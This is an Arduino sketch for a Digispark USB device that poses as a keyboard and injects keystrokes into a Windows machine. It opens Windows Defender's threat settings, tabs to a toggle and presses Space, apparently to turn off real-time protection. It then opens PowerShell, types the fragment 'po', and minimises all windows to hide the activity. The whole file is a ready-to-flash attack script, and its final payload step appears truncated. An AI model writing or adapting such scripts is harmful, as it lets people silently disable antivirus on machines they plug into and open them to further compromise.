
#include "DigiKeyboard.h"

void setup() {
     pinMode(1, OUTPUT);
   

    digitalWrite(1, HIGH); 
    delay(200);          
    digitalWrite(1, LOW); 
    delay(200);
    
    DigiKeyboard.sendKeyStroke(0);
    digitalWrite(1, HIGH); 

    DigiKeyboard.delay(100);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    digitalWrite(1, LOW); 
    delay(20);
     digitalWrite(1, HIGH); 
    delay(20); 
    DigiKeyboard.delay(1100);
    DigiKeyboard.print("windowsdefender://threat/");
    digitalWrite(1, LOW); 
    delay(20);
     digitalWrite(1, HIGH); 
    delay(20); 
    DigiKeyboard.delay(150);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    digitalWrite(1, LOW); 
    delay(20);
     digitalWrite(1, HIGH); 
    delay(20); 
    DigiKeyboard.delay(4500);
  

    DigiKeyboard.sendKeyStroke(43); 
    digitalWrite(1, LOW); 
    delay(20);
     digitalWrite(1, HIGH); 
    delay(20); 
    DigiKeyboard.delay(80);
    DigiKeyboard.sendKeyStroke(43); 
    digitalWrite(1, LOW); 
    delay(20);
     digitalWrite(1, HIGH); 
    delay(20); 
    DigiKeyboard.delay(80);
    DigiKeyboard.sendKeyStroke(43);  
    digitalWrite(1, LOW); 
    delay(20);
     digitalWrite(1, HIGH); 
    delay(20); 
    DigiKeyboard.delay(80);
    DigiKeyboard.sendKeyStroke(43); 
    digitalWrite(1, LOW); 
    delay(20);
     digitalWrite(1, HIGH); 
    delay(20); 
    DigiKeyboard.delay(80);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    digitalWrite(1, LOW); 
    delay(20);
     digitalWrite(1, HIGH); 
    delay(20); 
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_SPACE);
    digitalWrite(1, LOW); 
    delay(20);
     digitalWrite(1, HIGH); 
    delay(20); 
    DigiKeyboard.delay(700);





     DigiKeyboard.sendKeyStroke(43); 
     digitalWrite(1, LOW); 
    delay(20);
     digitalWrite(1, HIGH); 
    delay(20); 
    DigiKeyboard.delay(80);
    DigiKeyboard.sendKeyStroke(43); 
    digitalWrite(1, LOW); 
    delay(20);
     digitalWrite(1, HIGH); 
    delay(20); 
    DigiKeyboard.delay(80);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    digitalWrite(1, LOW); 
    delay(20);
     digitalWrite(1, HIGH); 
    delay(20); 


    


    DigiKeyboard.delay(2000);

    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    digitalWrite(1, LOW); 
    delay(20);
     digitalWrite(1, HIGH); 
    delay(20); 
    DigiKeyboard.delay(700);
    DigiKeyboard.print("powershell");
    digitalWrite(1, LOW); 
    delay(20);
     digitalWrite(1, HIGH); 
    delay(20); 
    DigiKeyboard.delay(180);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    digitalWrite(1, LOW); 
    delay(20);
     digitalWrite(1, HIGH); 
    delay(20); 
    DigiKeyboard.delay(3766);

    DigiKeyboard.print("po");
    digitalWrite(1, LOW); 
    delay(20);
     digitalWrite(1, HIGH); 
    delay(20); 
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    digitalWrite(1, LOW); 
    delay(20);
     digitalWrite(1, HIGH); 
    delay(20); 
    DigiKeyboard.sendKeyStroke(KEY_M, MOD_GUI_LEFT);
    digitalWrite(1, LOW); 
    delay(20);
     digitalWrite(1, HIGH); 
    delay(20); 
}
void loop() {
  digitalWrite(1, HIGH); 
  delay(300);          
  digitalWrite(1, LOW);  
  delay(300);
}









 

